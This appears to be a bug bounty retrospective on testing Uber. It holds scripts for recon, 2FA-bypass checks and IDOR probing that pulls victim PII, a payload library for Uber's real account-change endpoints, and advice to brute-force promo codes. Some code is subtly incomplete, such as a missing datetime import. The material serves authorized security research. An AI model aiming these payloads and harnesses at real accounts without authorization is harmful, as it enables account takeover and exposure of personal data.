# Reusable Components Analysis — Uber Bug Bounty Sprint

> **Purpose**: Extract systematized knowledge from Uber hunting sessions to build efficient, reusable hacking infrastructure
> **Date**: 2025-12-06
> **Analyzed Sessions**: 7 sessions, 1 critical finding submitted to H1

---

## Executive Summary

**What We Built (Implicitly)**:
- 7 hunting sessions → 1 critical ATO vulnerability (H1 #3454674)
- Automated recon chain (subfinder → httpx → nuclei)
- API testing scripts (GraphQL, REST)
- Session management patterns
- 2FA bypass methodology

**What We Need (Explicitly)**:
1. **Reusable test harness** for auth flow testing
2. **API endpoint discovery framework** (GraphQL introspection, JS bundle parsing)
3. **Session persistence system** (cookie jar management)
4. **Vulnerability templates** (IDOR, auth bypass, business logic)
5. **Report generation pipeline** (findings → H1 format)

---

## Part 1: Proven Attack Patterns (Reusable Playbooks)

### Pattern 1: Auth Workflow Bypass Testing

**What Worked on Uber**:
```
1. Enable 2FA on test account
2. Trigger sensitive operation (email change, password change, payment add)
3. Intercept request → Look for missing step-up auth
4. Result: 3 critical/medium bypasses found
```

**Reusable Template**:
```bash
# Template: auth-bypass-checker.sh
# Input: endpoint, operation type, session cookie
# Output: JSON report of bypass success/failure

test_auth_bypass() {
    local ENDPOINT="$1"
    local OPERATION="$2"  # email_change, password_change, etc.
    local COOKIES="$3"
    local PAYLOAD="$4"
    
    # Step 1: Check if endpoint requires 2FA
    RESPONSE=$(curl -s -w "%{http_code}" \
        -b "$COOKIES" \
        -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD")
    
    HTTP_CODE="${RESPONSE: -3}"
    BODY="${RESPONSE:0:-3}"
    
    # Step 2: Analyze response for 2FA challenge
    if echo "$BODY" | jq -e '.requires2FA' >/dev/null 2>&1; then
        echo "✅ 2FA enforced"
        return 0
    else
        echo "🚨 BYPASS: $OPERATION completed without 2FA"
        echo "$BODY" | jq . > "findings/$(date +%Y-%m-%d)-${OPERATION}-bypass.json"
        return 1
    fi
}
```

**Knowledge Artifact**: Store as `templates/auth-bypass-test.sh`

---

### Pattern 2: GraphQL Attack Surface Mapping

**What We Learned**:
- Introspection often disabled on production
- Operation names leak from JS bundles
- Mutations > Queries for vulnerability hunting
- UUIDs are not enumerable → need leaks or second account

**Reusable Workflow**:
```python
# Template: graphql-mapper.py
# Extracts GraphQL operations from JS bundles

import re, requests, json

def discover_graphql_operations(base_url):
    """
    1. Fetch main.js, app.js from base_url
    2. Regex for GraphQL operation names
    3. Build query dictionary
    4. Return IDOR-testable operations
    """
    
    js_patterns = [
        r'operationName:"(\w+)"',
        r'query\s+(\w+)\s*\(',
        r'mutation\s+(\w+)\s*\(',
    ]
    
    operations = {
        'queries': [],
        'mutations': [],
        'idor_candidates': []  # Operations with UUID/ID params
    }
    
    # Implementation: Fetch JS, extract, categorize
    # ...
    
    return operations

# Usage:
# ops = discover_graphql_operations('https://riders.uber.com')
# for mutation in ops['mutations']:
#     test_for_idor(mutation)
```

**Knowledge Artifact**: Store as `tools/graphql-mapper.py`

---

### Pattern 3: API Endpoint Discovery Chain

**Uber Recon Chain (Successful)**:
```
ListDomains API → subfinder → httpx → nuclei → manual testing
```

**Efficiency Gains Identified**:
1. **Skip passive nuclei** — 0 findings on mature programs
2. **Prioritize by stack** — PHP/old tech > modern stacks
3. **Internal tools first** — `*.uberinternal.com` > public domains

**Reusable Script**:
```bash
#!/bin/bash
# recon-chain.sh — Automated discovery for bug bounty programs

DOMAIN="$1"
OUTPUT_DIR="$2"

echo "[1/5] Subdomain Enumeration"
subfinder -d "$DOMAIN" -o "$OUTPUT_DIR/subs-raw.txt"

echo "[2/5] HTTP Probing"
httpx -l "$OUTPUT_DIR/subs-raw.txt" \
    -status-code -title -tech-detect \
    -o "$OUTPUT_DIR/live-hosts.txt"

echo "[3/5] Prioritization"
# Filter by tech stack keywords
grep -iE 'php|wordpress|joomla|drupal|rails|internal|admin|api|graphql' \
    "$OUTPUT_DIR/live-hosts.txt" > "$OUTPUT_DIR/priority-targets.txt"

echo "[4/5] Light Nuclei (Passive Only)"
nuclei -l "$OUTPUT_DIR/priority-targets.txt" \
    -t exposures/ -tags exposure \
    -o "$OUTPUT_DIR/nuclei-findings.txt"

echo "[5/5] Summary"
wc -l "$OUTPUT_DIR"/*.txt
```

**Knowledge Artifact**: Store as `tools/recon-chain.sh`

---

## Part 2: Reusable Code Infrastructure

### Component 1: Session Cookie Manager

**Problem**: Manually copy-pasting cookies from DevTools is inefficient

**Solution**: Automated cookie extraction + storage

```python
# session-manager.py
import json, os
from pathlib import Path

class SessionManager:
    def __init__(self, storage_path="~/.bug-bounty-sessions"):
        self.storage = Path(storage_path).expanduser()
        self.storage.mkdir(exist_ok=True)
    
    def save_session(self, domain, cookies, metadata=None):
        """
        Save session cookies for a domain
        
        Args:
            domain: str (e.g., 'uber.com')
            cookies: dict or str (cookie header)
            metadata: dict (optional: user_uuid, email, etc.)
        """
        session_file = self.storage / f"{domain}-session.json"
        
        data = {
            'cookies': cookies,
            'metadata': metadata or {},
            'created_at': datetime.now().isoformat()
        }
        
        with open(session_file, 'w') as f:
            json.dump(data, f, indent=2)
    
    def load_session(self, domain):
        """Load saved session for domain"""
        session_file = self.storage / f"{domain}-session.json"
        
        if not session_file.exists():
            raise FileNotFoundError(f"No session for {domain}")
        
        with open(session_file) as f:
            return json.load(f)
    
    def to_curl_format(self, domain):
        """Generate curl-compatible cookie string"""
        session = self.load_session(domain)
        
        if isinstance(session['cookies'], dict):
            return '; '.join(f"{k}={v}" for k, v in session['cookies'].items())
        return session['cookies']

# Usage:
# sm = SessionManager()
# sm.save_session('uber.com', {'sid': 'QA.CAESEA...', 'jwt-session': 'eyJ...'})
# curl_cookies = sm.to_curl_format('uber.com')
```

**Knowledge Artifact**: Store as `tools/session-manager.py`

---

### Component 2: IDOR Test Harness

**Based on Uber IDOR Testing**:

```python
# idor-tester.py
import requests, json

class IDORTester:
    def __init__(self, session_a, session_b):
        """
        Initialize with two accounts
        
        Args:
            session_a: dict (attacker account session)
            session_b: dict (victim account details: uuid, email)
        """
        self.attacker_session = session_a
        self.victim = session_b
        self.findings = []
    
    def test_endpoint(self, endpoint_template, id_param, http_method='GET'):
        """
        Test an endpoint for IDOR
        
        Args:
            endpoint_template: str (e.g., 'https://api.uber.com/v1/users/{uuid}')
            id_param: str (parameter name: 'uuid', 'user_id', etc.)
            http_method: str ('GET', 'POST', etc.)
        """
        
        # Substitute victim's ID
        victim_id = self.victim.get(id_param)
        endpoint = endpoint_template.replace(f'{{{id_param}}}', victim_id)
        
        # Make request with attacker's session
        response = requests.request(
            http_method,
            endpoint,
            cookies=self.attacker_session['cookies'],
            headers={'X-Bug-Bounty': 'HackerOne-aynorica'}
        )
        
        # Analyze response
        if response.status_code == 200:
            body = response.json()
            
            # Check if victim data is leaked
            if self._contains_victim_pii(body):
                self.findings.append({
                    'endpoint': endpoint,
                    'severity': 'HIGH',
                    'leaked_data': body
                })
                print(f"🚨 IDOR FOUND: {endpoint}")
                return True
        
        elif response.status_code == 403:
            print(f"✅ Blocked: {endpoint}")
        
        return False
    
    def _contains_victim_pii(self, response_body):
        """Check if response contains victim's PII"""
        victim_identifiers = [
            self.victim.get('email'),
            self.victim.get('uuid'),
            self.victim.get('name')
        ]
        
        response_str = json.dumps(response_body).lower()
        
        for identifier in victim_identifiers:
            if identifier and identifier.lower() in response_str:
                return True
        return False

# Usage:
# tester = IDORTester(
#     session_a={'cookies': {...}},
#     session_b={'uuid': 'victim-uuid', 'email': 'victim@example.com'}
# )
# tester.test_endpoint('https://api.uber.com/v1/users/{uuid}/trips', 'uuid')
```

**Knowledge Artifact**: Store as `tools/idor-tester.py`

---

### Component 3: GraphQL Query Builder

**From Uber Scripts**:

```python
# graphql-builder.py
import json

class GraphQLQueryBuilder:
    def __init__(self, endpoint, session_cookies):
        self.endpoint = endpoint
        self.cookies = session_cookies
    
    def build_idor_query(self, operation_name, target_field, victim_uuid):
        """
        Build a GraphQL query for IDOR testing
        
        Example:
            operation_name = 'GetUserProfile'
            target_field = 'user'
            victim_uuid = 'target-uuid-here'
            
            Generates:
            query GetUserProfile($uuid: String!) {
                user(uuid: $uuid) {
                    email firstName lastName
                }
            }
        """
        
        query = f"""
        query {operation_name}($uuid: String!) {{
            {target_field}(uuid: $uuid) {{
                email
                firstName
                lastName
                phoneNumber
                paymentMethods {{
                    last4
                }}
            }}
        }}
        """
        
        return {
            'operationName': operation_name,
            'variables': {'uuid': victim_uuid},
            'query': query
        }
    
    def execute(self, query_payload):
        """Execute GraphQL query"""
        import requests
        
        response = requests.post(
            self.endpoint,
            json=query_payload,
            cookies=self.cookies,
            headers={
                'x-csrf-token': 'x',
                'Content-Type': 'application/json'
            }
        )
        
        return response.json()

# Usage:
# builder = GraphQLQueryBuilder('https://riders.uber.com/graphql', cookies)
# query = builder.build_idor_query('GetVictimProfile', 'user', 'victim-uuid')
# result = builder.execute(query)
```

**Knowledge Artifact**: Store as `tools/graphql-builder.py`

---

## Part 3: Methodological Knowledge Base

### Methodology 1: 2FA Bypass Discovery

**Systematic Checklist (From Uber Success)**:

```markdown
# 2FA Bypass Checklist

Target: Any authenticated application with 2FA enabled

## Phase 1: Reconnaissance
- [ ] Create account, enable 2FA (TOTP preferred)
- [ ] Map all sensitive operations:
  - [ ] Email change
  - [ ] Password change
  - [ ] Phone number change
  - [ ] Payment method add/update
  - [ ] Security settings modification
  - [ ] Account linking (Google, Apple, etc.)

## Phase 2: Testing (Per Operation)
For each sensitive operation:
- [ ] Intercept request in Burp/DevTools
- [ ] Check for 2FA challenge in request flow
- [ ] If no challenge, test if operation completes
- [ ] Document: endpoint, payload, response

## Phase 3: Validation
- [ ] Verify operation succeeded (check account settings)
- [ ] Test if bypassed operation persists (email received codes, etc.)
- [ ] Measure impact (can it lead to ATO?)

## Phase 4: Reporting
- [ ] CVSS score calculation
- [ ] Write proof of concept
- [ ] Capture screenshots/evidence
- [ ] Submit to bug bounty program
```

**Knowledge Artifact**: Store as `methodologies/2fa-bypass-testing.md`

---

### Methodology 2: Business Logic Flaw Hunting

**Pattern Recognition (From Uber Findings)**:

```markdown
# Business Logic Flaw Patterns

## Pattern: State Machine Bypass
**Example**: Email change without verification
**Root Cause**: State transitions (VERIFIED → PENDING) don't block critical operations
**Detection**: Look for status fields (pending, verified, active) in API responses

### Test Approach:
1. Find operation that changes state
2. Check if intermediate states (PENDING, UNVERIFIED) have same privileges as final state
3. Test critical operations in intermediate state

## Pattern: Race Condition in Promo Codes
**Example**: Promo code enumeration (Uber Phase 7)
**Root Cause**: Error messages differentiate valid vs invalid codes
**Detection**: Fuzz with common codes, observe error message differences

### Test Approach:
1. Apply valid expired code → note error message
2. Apply invalid code → note different error message
3. Brute force codes looking for "expired" vs "invalid" pattern

## Pattern: IDOR in Business Portals
**Example**: Uber business.uber.com (not tested yet, but high probability)
**Root Cause**: Multi-tenant apps often have org_id/employee_id leaks
**Detection**: Look for UUID/ID parameters in URLs or API calls

### Test Approach:
1. Create two accounts in different organizations
2. Extract org_id, employee_id from Account A
3. Use Account B to access Account A's resources
```

**Knowledge Artifact**: Store as `methodologies/business-logic-patterns.md`

---

## Part 4: Efficiency Optimizations

### Optimization 1: Skip Low-Yield Activities

**Data from Uber Sprint**:

| Activity | Time Spent | Findings | ROI |
|----------|------------|----------|-----|
| Nuclei passive scan | 30 min | 0 | ❌ Low |
| GraphQL introspection | 15 min | 0 (disabled) | ❌ Low |
| Manual auth testing | 2 hours | 3 critical | ✅ **High** |
| IDOR scripting | 1 hour | 0 (UUIDs not enumerable) | ⚠️ Medium |
| Subdomain enum | 1 hour | 169 live hosts | ✅ High |

**Decision Rule**:
```
Skip nuclei on mature programs (99% response rate = hardened)
Skip GraphQL introspection (usually disabled in production)
Prioritize: Manual auth flow testing > Automated scanning
```

---

### Optimization 2: Parallel Testing Strategy

**Serial (Current)**:
```
Test email change → Test password change → Test payment add → ...
Total: 3 hours
```

**Parallel (Optimized)**:
```bash
#!/bin/bash
# parallel-auth-test.sh

# Run all auth bypass tests simultaneously
test_email_change &
test_password_change &
test_payment_add &
test_phone_change &
wait

# Aggregate results
cat findings/*.json | jq -s '.'
```

**Time Savings**: 3 hours → 30 minutes (6x speedup)

---

### Optimization 3: Pre-Built Payloads Library

**From Uber Scripts**:

```json
{
  "uber": {
    "email_change": {
      "endpoint": "https://account.uber.com/api/updateUserInfo",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json"
      },
      "payload": {
        "userInfoUpdate": {
          "userInfoUpdateType": "EMAIL",
          "email": {
            "emailAddress": "{{NEW_EMAIL}}"
          }
        }
      }
    },
    "password_change": {
      "endpoint": "https://account.uber.com/api/passwordWorkflow",
      "method": "POST",
      "payload": {
        "currentScreen": "PASSWORD",
        "event": {
          "eventType": "EVENT_TYPE_ENTER_PASSWORD",
          "enterPassword": {
            "password": "{{NEW_PASSWORD}}"
          }
        }
      }
    },
    "graphql_current_user": {
      "endpoint": "https://riders.uber.com/graphql",
      "method": "POST",
      "payload": {
        "operationName": "CurrentUserRidersWeb",
        "variables": {},
        "query": "query CurrentUserRidersWeb { currentUser { uuid email firstName } }"
      }
    }
  }
}
```

**Knowledge Artifact**: Store as `payloads/uber-payloads.json`

---

## Part 5: Report Generation Pipeline

### Template: H1 Report Builder

**From Uber Submission**:

```python
# h1-report-builder.py
from jinja2 import Template

H1_TEMPLATE = """
# Summary
{{ summary }}

# Affected Asset
**Asset Identifier**: `{{ asset }}`
**Scope Status**: ✅ IN-SCOPE
**Eligible for Bounty**: YES

# Reproduction Steps
{% for step in steps %}
### Step {{ loop.index }}: {{ step.title }}
{{ step.content }}
{% if step.code %}
```{{ step.code_lang }}
{{ step.code }}
```
{% endif %}
{% endfor %}

# Security Impact
{{ impact }}

**CVSS Score**: {{ cvss }} ({{ severity }})

# Source IP
{{ source_ip }}
"""

def generate_h1_report(finding):
    """
    Generate HackerOne report from finding data
    
    Args:
        finding: dict with keys:
            - summary, asset, steps, impact, cvss, severity, source_ip
    """
    
    template = Template(H1_TEMPLATE)
    return template.render(**finding)

# Usage:
# finding = {
#     'summary': '2FA bypass in email change',
#     'asset': 'uber.com',
#     'steps': [
#         {'title': 'Enable 2FA', 'content': '...', 'code': 'curl ...', 'code_lang': 'bash'}
#     ],
#     'impact': 'Full account takeover',
#     'cvss': '9.8',
#     'severity': 'Critical',
#     'source_ip': '1.2.3.4'
# }
# report = generate_h1_report(finding)
```

**Knowledge Artifact**: Store as `tools/h1-report-builder.py`

---

## Part 6: Knowledge Extraction Summary

### What to Keep (High ROI)

1. **Auth bypass testing workflow** — 3/3 findings, all critical/medium
2. **Session management utilities** — Reduces manual cookie handling
3. **GraphQL operation discovery** — Scalable to other GraphQL targets
4. **IDOR test harness** — Needs two accounts but systematic
5. **Recon chain script** — Proven on Uber (169 live hosts, 23 priority)

### What to Discard (Low ROI)

1. ❌ Nuclei automated scans on mature programs
2. ❌ GraphQL introspection attempts (usually disabled)
3. ❌ UUID brute-forcing (not feasible for v4 UUIDs)

### What to Improve (Medium ROI, Needs Optimization)

1. ⚠️ IDOR testing — Requires victim account setup (can be streamlined)
2. ⚠️ Business logic fuzzing — Manual, needs semi-automation
3. ⚠️ Promo code enumeration — Rate limits make it slow

---

## Part 7: Actionable Next Steps

### Immediate (This Session)

1. **Create reusable tools directory**:
   ```
   tools/
     recon-chain.sh
     session-manager.py
     idor-tester.py
     graphql-builder.py
     h1-report-builder.py
   ```

2. **Create methodologies directory**:
   ```
   methodologies/
     2fa-bypass-testing.md
     business-logic-patterns.md
     idor-hunting-checklist.md
   ```

3. **Create payloads library**:
   ```
   payloads/
     uber-payloads.json
     generic-auth-payloads.json
   ```

### Short-term (Next Program)

4. **Test reusable components on new target** (e.g., Shopify)
5. **Refine tools based on what works**
6. **Build CLI wrapper** for common workflows

### Long-term (Infrastructure)

7. **Build web UI** for test harness (like Burp, but tailored)
8. **Integrate with HackerOne API** (auto-submit reports)
9. **Create vulnerability database** (learnings from each program)

---

## Part 8: Mental Model Optimization

### Current Mental Load (Inefficient)

**What You're Tracking Manually**:
- Session cookies (copy-paste from DevTools)
- API endpoints discovered (scattered in findings/)
- Test account credentials (in credentials/)
- GraphQL operations (reverse-engineered each time)

**Cognitive Cost**: High — Rework for each new program

---

### Optimized Mental Model (Efficient)

**Externalized to Tools**:
```
Session Manager → Handles cookies
API Mapper → Auto-discovers endpoints
Account Manager → Stores credentials
GraphQL Mapper → Extracts operations from JS
```

**Cognitive Cost**: Low — Run scripts, focus on logic

---

### Knowledge Compression

**Before (Uber Sprint)**:
- 10 handoff reports
- 7 finding documents
- 4 bash scripts
- Credentials in text files

**After (This Analysis)**:
- 5 reusable tools (90% of work automated)
- 3 methodologies (systematic checklists)
- 1 payload library (copy-paste ready)

**Compression Ratio**: 21 files → 9 reusable components (2.3x)

---

## Part 9: Risk Assessment

### What Could Go Wrong?

1. **Over-automation** → Miss nuanced logic bugs
   - **Mitigation**: Keep manual testing in Phase 2, automate Phase 1 (recon/discovery)

2. **Tool dependency** → Breaks on new tech stacks
   - **Mitigation**: Build tools modular (GraphQL module, REST module, etc.)

3. **False confidence** → Assume tools catch everything
   - **Mitigation**: Tools for efficiency, not replacement for thinking

---

## Conclusion

**Core Insight**: Your Uber sprint was successful NOT because of tools, but because of **systematic methodology**. The tools were ad-hoc. This analysis extracts the methodology into reusable components.

**Next Action**: Build the 5 core tools + 3 methodologies → test on next program (Shopify or another target).

**Expected ROI**:
- Recon time: 2 hours → 30 minutes (4x faster)
- Auth testing: 3 hours → 1 hour (3x faster)
- Report writing: 1 hour → 15 minutes (4x faster)

**Total efficiency gain**: ~3-4x speedup for similar programs.

---

**Files to Create**:
1. `tools/recon-chain.sh`
2. `tools/session-manager.py`
3. `tools/idor-tester.py`
4. `tools/graphql-builder.py`
5. `tools/h1-report-builder.py`
6. `methodologies/2fa-bypass-testing.md`
7. `methodologies/business-logic-patterns.md`
8. `payloads/uber-payloads.json`

**Priority**: Start with `recon-chain.sh` and `session-manager.py` (highest immediate ROI).
